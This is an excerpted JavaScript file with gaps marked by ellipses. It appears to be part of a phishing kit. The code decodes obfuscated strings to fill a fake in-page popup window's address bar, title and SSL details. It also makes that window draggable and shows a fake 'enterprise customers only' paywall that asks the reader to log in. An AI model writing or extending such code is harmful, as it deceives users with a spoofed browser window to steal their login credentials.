...
function deObfData() {
  try {
    // URI Bar
    document.getElementById('pop-uri-prefix').innerText =
      deobfString(document.getElementById('pop-uri-prefix').innerText) + '//';
    document.getElementById('pop-uri-host').innerText = deobfString(
      document.getElementById('pop-uri-host').innerText
    );
    document.getElementById('pop-uri-path').innerText =
      '/' + deobfString(document.getElementById('pop-uri-path').innerText);

    // Rest
    document.getElementById('pop-title-text').innerText = deobfString(
      document.getElementById('pop-title-text').innerText
    );

    document.getElementById('pop-ssl-head-title').innerText = deobfString(
      document.getElementById('pop-ssl-head-title').innerText
    );
    document.getElementById('pop-ssl-text-1').innerText = deobfString(
      document.getElementById('pop-ssl-text-1').innerText
    );
    document.getElementById('pop-ssl-text-2').innerText = deobfString(
      document.getElementById('pop-ssl-text-2').innerText
    );
    document.getElementById('pop-ssl-text-3').innerText = deobfString(
      document.getElementById('pop-ssl-text-3').innerText
    );
  } catch {
    return;
  }
      ...
      $(document.body)
        ...
        .on('mouseup', function (e) {
          ...
          if (dr.hasClass('drag')) {
            ...
            localStorage.setItem(
              'win-scroll-offset',
              JSON.stringify(winScrollOffset)
            );
          }
        });
    }
...
async function setPrimaryContent(locationDivId, contentHTML, cssUrls, jsUrls) {
  ...
  const checkAllLoaded = () => {
    if (scriptsToLoad === 0) {
      ...
      const contentLoadedEvent = new Event('PrimaryContentLoaded', {
        bubbles: true,
        composed: true,
      });
...
function handleIsOpenedState(shadowRoot) {
  ...
  // Check if we just reached the final flow page or flow was already completed
    ...
    shadowRoot.dispatchEvent(
      new CustomEvent('secondaryFlowCompleted', {
        bubbles: true,
        composed: true,
      })
    );
...
function startObserving(targetSelector) {
  ...
  const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
      ...
      if (
        mutation.type === 'attributes' &&
        targetElement.classList.contains('drag')
      ) {
...
const primaryHTML = `
    <main>
            <div class="root">
                <img class="main" src="/primary/images/filler.png" alt="filler" />
                <div id="primary-overlay-container">
                    <div id="paywall-modal">
                        <h3 id="lg-h">This document is exclusively for enterprise customers</h3>
                        <p id="lg-p">If you received this document, please login to continue.</p>   
